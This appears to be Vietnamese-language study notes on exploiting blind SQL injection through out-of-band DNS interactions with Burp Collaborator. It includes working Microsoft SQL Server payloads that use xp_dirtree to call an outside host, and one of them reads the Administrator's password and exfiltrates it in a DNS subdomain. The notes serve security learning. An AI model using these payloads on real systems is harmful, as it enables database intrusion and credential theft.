# Exploiting blind SQL injection using out-of-band (OAST) techniques

Một ứng dụng có thể thực hiện cùng một truy vấn SQL như ví dụ trước nhưng theo cách bất đồng bộ. Ứng dụng tiếp tục xử lý yêu cầu của người dùng trong luồng ban đầu và sử dụng một luồng khác để thực thi truy vấn SQL bằng tracking cookie.

Truy vấn vẫn có lỗ hổng SQL Injection, nhưng tất cả các kỹ thuật đã đề cập trước đó đều không hiệu quả. Lý do là vì phản hồi của ứng dụng không phụ thuộc vào việc truy vấn có trả về dữ liệu, có lỗi xảy ra, hoặc thời gian thực thi truy vấn.

Trong tình huống này, có thể khai thác SQL Injection mù bằng cách kích hoạt tương tác mạng out-of-band tới một hệ thống do mình kiểm soát. Những tương tác này có thể được kích hoạt dựa trên một điều kiện tiêm vào truy vấn, từ đó suy ra từng phần thông tin. Quan trọng hơn, dữ liệu có thể được rò rỉ trực tiếp trong quá trình này.

Nhiều giao thức mạng có thể được sử dụng cho mục đích này, nhưng giao thức hiệu quả nhất thường là DNS (Domain Name Service). Hầu hết các hệ thống trong môi trường sản xuất đều cho phép thoát lưu lượng DNS, vì nó là cần thiết cho hoạt động bình thường của hệ thống.

# Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued

Công cụ đơn giản và đáng tin cậy nhất để sử dụng kỹ thuật out-of-band là Burp Collaborator. Đây là một máy chủ cung cấp các dịch vụ mạng tùy chỉnh, bao gồm DNS, giúp phát hiện khi có tương tác mạng xảy ra do tải trọng (payload) được gửi tới một ứng dụng dễ bị tấn công.

**Kích hoạt truy vấn DNS dựa trên loại cơ sở dữ liệu**

Cách kích hoạt truy vấn DNS phụ thuộc vào loại cơ sở dữ liệu đang sử dụng. Ví dụ, trên Microsoft SQL Server, có thể thực hiện bằng cách sử dụng payload sau:

    '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
Lệnh trên buộc cơ sở dữ liệu thực hiện truy vấn DNS đến miền sau:

    0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net

# Lab: Blind SQL injection with out-of-band interaction

# Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued

Sau khi xác nhận rằng có thể kích hoạt tương tác ngoài băng tần (OAST), có thể sử dụng kênh này để trích xuất dữ liệu từ ứng dụng bị tấn công. Ví dụ:

    '; declare @p varchar(1024);
    set @p=(SELECT password FROM users WHERE username='Administrator');
    exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

Giải thích truy vấn
- Bước 1: Truy vấn mật khẩu của user "Administrator".
- Bước 2: Ghép mật khẩu với một subdomain Collaborator duy nhất.
- Bước 3: Kích hoạt truy vấn DNS đến burpcollaborator.net, chứa giá trị mật khẩu trong tên miền.

Ví dụ kết quả nhận được: 

Nếu mật khẩu của user "Administrator" là S3cure, máy chủ sẽ gửi truy vấn DNS như sau:

    S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net

**Lưu ý**: Có nhiều cách khác nhau để kích hoạt tương tác OAST, tùy vào từng loại cơ sở dữ liệu.


